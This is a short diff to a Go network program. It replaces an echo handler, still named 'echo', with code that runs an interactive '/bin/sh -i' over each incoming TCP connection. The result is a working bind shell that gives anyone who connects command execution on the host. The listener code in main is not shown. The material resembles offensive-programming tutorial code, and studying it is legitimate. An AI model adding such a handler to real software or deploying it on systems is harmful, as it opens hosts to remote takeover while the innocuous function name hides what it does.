@@ -3,16 +3,20 @@ package main
 import (
 	"io"
 	"net"
+	"os/exec"
 
 	"log"
 )
 
 func echo(conn net.Conn) {
-	defer conn.Close()
+	cmd := exec.Command("/bin/sh", "-i")
 
-	if _, err := io.Copy(conn, conn); err != nil {
-		log.Fatalf("Unable to read/write data: %s", err.Error())
-	}
+	rp, wp := io.Pipe()
+	cmd.Stdin = conn
+	cmd.Stdout = wp
+	go io.Copy(conn, rp)
+	cmd.Run()
+	conn.Close()
 }
 
 func main() {
